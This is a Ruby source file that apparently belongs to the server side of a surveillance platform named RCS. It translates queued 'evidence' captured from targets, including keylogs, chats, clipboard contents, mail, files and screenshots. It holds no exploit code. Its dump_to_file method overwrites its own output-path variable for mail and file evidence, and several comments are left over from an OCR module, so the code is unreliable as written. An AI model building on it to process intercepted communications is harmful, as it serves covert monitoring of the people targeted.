#
# TRANSLATE processing module
#
# the evidence to be processed are queued by the workers
#

require_relative 'sdl'

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'fileutils'

module RCS
module Translate

class Processor
  extend RCS::Tracer

  def self.run
    db = Mongoid.database
    coll = db.collection('trans_queue')

    trace :info, "TRANSLATE ready to go..."

    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      #if entry = coll.find_and_modify({query: {flag: TransQueue::QUEUED}, update: {"$set" => {flag: TransQueue::PROCESSED}}})
      if entry = coll.find_and_modify({query: {flag: TransQueue::QUEUED}, update: {"$set" => {flag: TransQueue::PROCESSED}}})
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])

    start = Time.now

    temp = RCS::DB::Config.instance.temp(ev[:_id].to_s)
    output = temp + '.trans'

    # dump the test to a file
    dump_to_file(entry['target_id'], ev, temp)
    size = File.size(temp)

    # invoke the ocr on the temp file and get the result
    if SDL.translate(temp, output)
      raise "output file not found" unless File.exist?(output)
    else
      raise "unable to process"
    end

    translated_text = File.open(output, 'r') {|f| f.read}

    FileUtils.rm_rf temp
    FileUtils.rm_rf output

    # take a copy of evidence data (we need to do this to trigger the mongoid save)
    data = ev[:data].dup
    # remove invalid UTF-8 chars
    data[:tr] = translated_text

    # update the evidence with the new text
    ev[:data] = data
    ev[:kw] += translated_text.keywords

    ev.save

    trace :info, "Evidence #{ev[:type]} processed in #{Time.now - start} seconds - text #{size.to_s_bytes} -> tr #{data[:tr].size.to_s_bytes}"

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    #trace :error, e.backtrace.join("\n")
    sleep 1
  end

  def self.dump_to_file(target, evidence, file)
    content = ''

    case evidence[:type]
      when 'keylog'
        content = evidence[:data]['content']
      when 'chat'
        content = evidence[:data]['content']
      when 'clipboard'
        content = evidence[:data]['content']
      when 'message'
        if evidence[:data][:type] == 'mail'
          file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
          content = file.read
        else
          content = evidence[:data]['content']
        end
      when 'file'
        file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
        content = file.read
      when 'screenshot'
        content = evidence[:data]['body']
      else
        raise 'unknown format'
    end

    File.open(file, 'w') {|f| f.write content} if content
  end

end

end #OCR::
end #RCS::